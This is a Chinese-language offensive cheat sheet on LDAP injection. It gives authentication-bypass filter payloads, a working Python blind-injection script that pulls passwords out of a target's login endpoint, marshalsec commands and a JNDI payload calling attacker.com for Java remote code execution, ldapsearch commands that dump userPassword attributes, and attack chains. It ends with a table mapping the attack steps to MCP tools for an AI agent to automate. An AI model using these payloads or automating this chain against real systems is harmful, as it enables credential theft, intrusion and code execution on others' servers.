# LDAP Injection

## LDAP 过滤器注入

```python
# LDAP filter 语法: (attribute=value)
# 注入点: value 部分未转义 → 攻撃者可修改 filter 逻辑

LDAP_PAYLOADS = [
    # 认证绕过
    # 原始: (&(uid={user})(password={pass}))
    # 注入: uid=*)(|(uid=*  → (&(uid=*)(|(uid=*)(password=xxx))
    # 结果: uid 通配 + OR → 恒真 → 绕过密码
    ("*)(uid=*))(|(uid=*", "Universal bypass"),
    ("admin)(&)", "Specific user"),
    ("*)(|(password=*", "Password wildcard"),

    # 盲注 — 逐字符提取 (类似 SQL 盲注)
    # (&(uid=admin)(password=a*))  → 匹配 → 密码以 a 开头
    ("*)(password={prefix}*", "Blind prefix"),

    # AND/OR 注入
    # (&(uid=admin)(|(department=IT)(department=HR))) → 多部门访问
    ("admin)(|(department=IT", "OR injection"),
]
```

## LDAP 盲注脚本

```python
# ldap_blind.py — 逐字符提取 LDAP 属性
import requests, string

def ldap_blind_extract(target: str, attribute: str = "password"):
    """通过 LDAP filter 盲注提取属性值"""
    charset = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
    extracted = ""

    while True:
        for ch in charset:
            test = extracted + ch
            # 构造盲注 filter
            # 原始: (&(uid=admin)(password={test}*))
            payload = f"*)({attribute}={test}*"
            r = requests.post(f"{target}/login", data={
                "username": payload,
                "password": "anything"
            })
            # 如果登录成功 → 匹配前缀
            if "Welcome" in r.text or r.status_code == 200:
                extracted = test
                print(f"[+] {attribute} = {extracted}")
                break
        else:
            break  # 没有更多字符
    return extracted
```

## LDAP → JNDI 反序列化 (Java)

```python
# 如果 LDAP 注入点传给 Java 的 InitialDirContext:
# 可以返回指向恶意 LDAP 服务器的引用 → JNDI 反序列化 → RCE

# 前提:
# 1. com.sun.jndi.ldap.object.trustURLCodebase = true (Java 8u191 前默认)
# 2. 或利用本地 gadget 链 (更高版本)

# 恶意 LDAP 服务器 (marshalsec)
# java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \
#   http://attacker.com/#Exploit 1389

# 注入 payload:
# ${jndi:ldap://attacker.com:1389/Exploit}
```

## OpenLDAP 特定攻击

```bash
# Anonymous bind — 匿名绑定读所有条目
ldapsearch -x -H ldap://ldap.target.com -b "dc=target,dc=com" "(objectClass=*)"

# 如果无密码策略 → 读所有用户和属性
ldapsearch -x -H ldap://ldap.target.com -b "dc=target,dc=com" \
  "(&(objectClass=person)(uid=*))" uid userPassword mail
```

## 攻击链

```
LDAP injection → 认证绕过 → 后台 → RCE
LDAP blind → 提取 userPassword → crack → 凭据重用
LDAP → JNDI reference → 反序列化 → Java RCE
OpenLDAP anonymous bind → 全量数据导出 → 账号枚举 → 密码喷射
LDAP filter injection → (&(uid=*)(memberOf=cn=admin,ou=groups)) → 提权
```

## Evidence

记录: LDAP filter payload、盲注的字符匹配日志、提取出的属性值、JNDI 外连日志

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| LDAP 注入端点探测 | `http_probe` | HTTP GET 探测 LDAP 查询端点 |
